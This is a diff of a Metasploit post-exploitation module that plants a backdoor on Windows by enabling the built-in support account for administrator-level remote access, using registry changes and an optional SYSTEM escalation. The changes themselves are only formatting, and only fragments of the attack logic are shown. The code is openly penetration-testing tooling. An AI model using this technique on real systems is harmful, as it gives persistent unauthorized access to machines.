@@ -7,29 +7,33 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Priv
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Trojanize Support Account',
-      'Description'   => %q{
-        This module enables alternative access to servers and workstations
-        by modifying the support account's properties. It will enable
-        the account for remote access as the administrator user while
-        taking advantage of some weird behavior in lusrmgr.msc. It will
-        check if sufficient privileges are available for registry operations,
-        otherwise it exits.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => 'salcho <salchoman[at]gmail.com>',
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ],
-      'References'	=> [ 'http://xangosec.blogspot.com/2013/06/trojanizing-windows.html' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Trojanize Support Account',
+        'Description' => %q{
+          This module enables alternative access to servers and workstations
+          by modifying the support account's properties. It will enable
+          the account for remote access as the administrator user while
+          taking advantage of some weird behavior in lusrmgr.msc. It will
+          check if sufficient privileges are available for registry operations,
+          otherwise it exits.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'salcho <salchoman[at]gmail.com>',
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'References'	=> [ 'http://xangosec.blogspot.com/2013/06/trojanizing-windows.html' ]
+      )
+    )
 
     register_options(
-    [
-      OptString.new('PASSWORD',  [true, 'Password of the support user account', 'password']),
-      OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', false])
-    ])
+      [
+        OptString.new('PASSWORD', [true, 'Password of the support user account', 'password']),
+        OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false])
+      ]
+    )
   end
 
   def run
@@ -67,7 +71,7 @@ class MetasploitModule < Msf::Post
     rid = -1
     print_status('Harvesting users...')
     names_key.each do |name|
-      if name.include?'SUPPORT_388945a0'
+      if name.include? 'SUPPORT_388945a0'
         print_good("Found #{name} account!")
         skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
         if not skey
